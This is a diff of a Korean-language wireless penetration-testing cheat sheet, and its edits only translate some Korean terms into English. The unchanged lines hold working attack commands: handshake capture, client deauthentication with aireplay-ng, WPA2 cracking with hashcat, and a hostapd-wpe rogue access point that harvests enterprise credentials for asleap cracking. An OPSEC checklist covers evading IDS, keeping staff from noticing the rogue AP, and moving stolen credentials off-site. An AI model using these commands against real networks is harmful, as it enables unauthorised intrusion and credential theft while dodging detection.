@@ -25,18 +25,18 @@ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
 
 ---
 
-## WPA2-PSK 크래킹
+## WPA2-PSK cracking
 
-### 4-way Handshake 캡처
+### 4-way Handshake capture
 
 ```bash
-# 1. target AP 채널 고정 + 캡처
+# 1. target AP 채널 고정 + capture
 airodump-ng -c 6 --bssid <BSSID> -w handshake wlan0mon
 
 # 2. client 에 deauth 쏴서 재 handshake 유도
 aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
 
-# 3. 크래킹. hashcat 22000 권장
+# 3. cracking. hashcat 22000 권장
 hcxpcapngtool -o hash.22000 handshake.cap
 hashcat -m 22000 hash.22000 rockyou.txt
 ```
@@ -62,7 +62,7 @@ hashcat -m 22000 hash.22000 wordlist.txt
 git clone https://github.com/OpenSecurityResearch/hostapd-wpe
 hostapd-wpe hostapd-wpe.conf
 
-# 캡처된 건 NetNTLMv1/v2 유사 포맷 (MSCHAPv2 challenge/response)
+# capture된 건 NetNTLMv1/v2 유사 포맷 (MSCHAPv2 challenge/response)
 # → asleap 또는 hashcat -m 5500
 asleap -C <challenge> -R <response> -W rockyou.txt
 ```
@@ -118,10 +118,10 @@ git clone https://github.com/scipag/nac_bypass
 ## OPSEC checklist
 
 - [ ] 공격용 디바이스 MAC 랜덤화 (`macchanger -r wlan0`)
-- [ ] Deauth 는 최소한만. 대량 패킷은 IDS 가 바로 잡는다
+- [ ] Deauth 는 최소한만. 대량 packet은 IDS 가 바로 잡는다
 - [ ] Rogue AP 신호세기는 정품과 비슷하게. 너무 세면 직원이 눈치챈다
-- [ ] 캡처한 hash / credential 은 바로 off-site 반출
-- [ ] 크래킹은 공격자 VPS 에서. target 와이파이 앞에서 돌리지 말 것
+- [ ] capture한 hash / credential 은 바로 off-site 반출
+- [ ] cracking은 공격자 VPS 에서. target 와이파이 앞에서 돌리지 말 것
 
 ---
 
